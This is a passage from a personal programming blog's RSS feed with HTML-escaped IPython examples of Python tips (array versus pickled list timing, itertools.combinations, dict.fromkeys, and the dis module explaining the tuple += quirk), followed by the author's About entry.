    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;array_temp.bin&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:     double_array&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;tofile(f)
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;: array_end_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;time() &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; start_time

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;]: int_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;))
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;: start_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;time()
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;list_temp.bin&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:     pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump(int_list, f)
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;: list_end_time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;time() &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; start_time

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;]: &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;It took {array_end_time} for int_array to complete&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;It took {list_end_time} for int_list to complete&amp;#34;&lt;/span&gt;)
It took &lt;span style=&#34;color:#ae81ff&#34;&gt;0.006399869918823242&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; int_array to complete
It took &lt;span style=&#34;color:#ae81ff&#34;&gt;0.03600811958312988&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; int_list to complete
In [&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.03600811958312988&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0.006399869918823242&lt;/span&gt;
Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;5.62638304213389&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;5 times&lt;/strong&gt; faster. That&amp;rsquo;s alot. Of course it also depends on the &lt;code&gt;pickle&lt;/code&gt; module, but still - the array is way more compact than the list. So if you are using simple numeric values, you should consider using the &lt;code&gt;array&lt;/code&gt; module.&lt;/p&gt;
&lt;h3 id=&#34;itertoolscombinations&#34;&gt;itertools.combinations&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;itertools&lt;/code&gt; is an impressive module. It has so many different time-saving methods, all of them are listed &lt;a href=&#34;https://docs.python.org/3/library/itertools.html&#34;&gt;here&lt;/a&gt;. There&amp;rsquo;s even a GitHub repository containing &lt;a href=&#34;https://github.com/erikrose/more-itertools&#34;&gt;More Itertools&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;I got to use the &lt;code&gt;combinations&lt;/code&gt; method this week and I thought I&amp;rsquo;d share it. This method takes an iterable and an integer as arguments, and creates a generator consisting of all possible combinations of the iterable with a maximum length of the integer given, without duplication:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;]: &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; itertools

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;]: list(itertools&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;combinations([&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;))
[(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;), (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;), (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;), (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;), (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;), (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;dictfromkeys&#34;&gt;dict.fromkeys&lt;/h3&gt;
&lt;p&gt;A quick and beatiful way of creating a dict with default values:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;]: dict&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromkeys([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key1&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key2&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;key3&amp;#34;&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DEFAULT_VALUE&amp;#34;&lt;/span&gt;)
{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;key1&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DEFAULT_VALUE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;key2&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DEFAULT_VALUE&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;key3&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DEFAULT_VALUE&amp;#39;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;last-but-not-least---the-dis-module&#34;&gt;Last but not least - the &lt;code&gt;dis&lt;/code&gt; module&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The &lt;a href=&#34;https://docs.python.org/3/library/dis.html#module-dis&#34;&gt;&lt;code&gt;dis&lt;/code&gt;&lt;/a&gt; module supports the analysis of CPython &lt;a href=&#34;https://docs.python.org/3/glossary.html#term-bytecode&#34;&gt;bytecode&lt;/a&gt; by disassembling it.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;As you may or may not know, Python compiles source code to a set of instructions called &amp;ldquo;bytecode&amp;rdquo;. The &lt;code&gt;dis&lt;/code&gt; module helps us handle these instructions, and it&amp;rsquo;s a great debugging tool.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s an example from the &lt;a href=&#34;http://shop.oreilly.com/product/0636920032519.do&#34;&gt;Fluent Python book&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;]: t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])
In [&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;]: t[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;]
&lt;span style=&#34;color:#f92672&#34;&gt;---------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;TypeError&lt;/span&gt;                                 Traceback (most recent call last)
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;ipython&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;input&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;af836a8d44a2&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;module&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;----&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; t[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;]

&lt;span style=&#34;color:#a6e22e&#34;&gt;TypeError&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tuple&amp;#39;&lt;/span&gt; object does &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; support item assignment

In [&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]: t
Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]: (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We got an error - but the operation still succeeded. How come? Well, if we look at the bytecode (I added comments for the important parts):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;]: dis&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dis(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;t[a] += b&amp;#34;&lt;/span&gt;)
  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_NAME                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (t)
              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; LOAD_NAME                &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; (a)
              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; DUP_TOP_TWO
              &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; BINARY_SUBSCR
              &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; LOAD_NAME                &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; (b)
             &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; INPLACE_ADD &lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt; (value &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; t[a]) &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; b &lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt; succeeds because list &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; mutable
             &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; ROT_THREE
             &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; STORE_SUBSCR &lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt; Assign t[a] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; our list &lt;span style=&#34;color:#f92672&#34;&gt;--&amp;gt;&lt;/span&gt; Fails, t[a] &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; immutable&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
             &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (None)
             &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; RETURN_VALUE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
        
        </description>
    </item>
    
    <item>
      <title>About</title>
      <link>https://adamgold.github.io/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://adamgold.github.io/about/</guid>
      <description>
        
          
          
          
        
        
        &lt;p&gt;Self-taught software engineer with 10 years of programming experience. Started out as a web developer but have transitioned to building software solutions and orchestrating architectures. Working mainly with Python, and am always independently learning new technologies. Passionate about security and the NBA :)&lt;/p&gt;
&lt;p&gt;This blog is my way of sharing exciting insights I come up with, mainly about programming and security.&lt;/p&gt;

        
        </description>
    </item>
    
  </channel>
</rss>